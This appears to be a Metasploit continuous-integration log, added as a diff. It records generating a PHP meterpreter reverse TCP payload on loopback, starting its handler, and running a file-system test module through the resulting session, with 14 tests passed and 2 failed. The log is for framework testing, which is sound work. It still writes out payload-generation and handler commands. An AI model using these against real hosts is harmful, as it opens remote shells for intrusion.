@@ -1,0 +1,64 @@
+use php/meterpreter_reverse_tcp
+msf6 payload(php/meterpreter_reverse_tcp) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-4920-e8eckrtxt
+msf6 payload(php/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-4920-e8eckrtxt
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-4920-echyd3.php -f raw AutoVerifySessionTimeout=30 lport=6009 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/phpmeterpreter_reverse_tcp_debug_log20231026-4920-ore3jtxt MeterpreterDebugBuild=true
+[*] Writing 34913 bytes to D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-4920-echyd3.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 8
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6009 
+[*] Meterpreter session 9 opened (127.0.0.1:6009 -> 127.0.0.1:50045) at 2023-10-26 19:05:10 +0000
+use test/file
+msf6 post(test/file) > run session=9 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-idcopqfr
+[*] meterpreter-test-dir-idcopqfr created
+[*] Setup: Now in C:\Users\RUNNER~1\AppData\Local\Temp\meterpreter-test-dir-idcopqfr
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 9
+[*] Session type is meterpreter and platform is windows
+[+] should test for directory existence
+[*] [should create directories] Creating directory meterpreter-test-dir
+[*] [should create directories] meterpreter-test-dir created
+[*] [should create directories] Creating directory meterpreter-test-dir\directory
+[*] [should create directories] meterpreter-test-dir\directory created
+[+] should create directories
+[+] should list the directory we just made
+[+] should recursively delete the directory we just made
+[*] [should delete a symbolic link target] Creating directory meterpreter-test-dir
+[*] [should delete a symbolic link target] meterpreter-test-dir created
+[-] [should delete a symbolic link target] FAILED: should delete a symbolic link target
+[-] [should delete a symbolic link target] Exception: Rex::Post::Meterpreter::RequestError: stdapi_fs_delete_dir: Operation failed: 1
+[*] [should not recurse into symbolic link directories] Creating directory meterpreter-test-dir.1
+[*] [should not recurse into symbolic link directories] meterpreter-test-dir.1 created
+[*] [should not recurse into symbolic link directories] Creating directory meterpreter-test-dir.2
+[*] [should not recurse into symbolic link directories] meterpreter-test-dir.2 created
+[+] should not recurse into symbolic link directories
+[+] should test for file existence
+[+] should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[*] [should write binary data] Writing 128000 bytes
+[*] [should write binary data] Finished in 0.128919
+[+] should write binary data
+[*] [should read the binary data we just wrote] Read 65536 bytes
+[-] FAILED: should read the binary data we just wrote
+[+] should delete binary files
+[*] [should append binary data] expected: [222, 173, 190, 239] - ASCII-8BIT
+[*] [should append binary data] actual: [222, 173, 190, 239] - ASCII-8BIT
+[+] should append binary data
+[*] Testing complete in 17.12 seconds
+[-] Passed: 14; Failed: 2; Skipped: 0
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/file) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 9 closed.
+msf6 post(test/file) > Stopping all jobs...
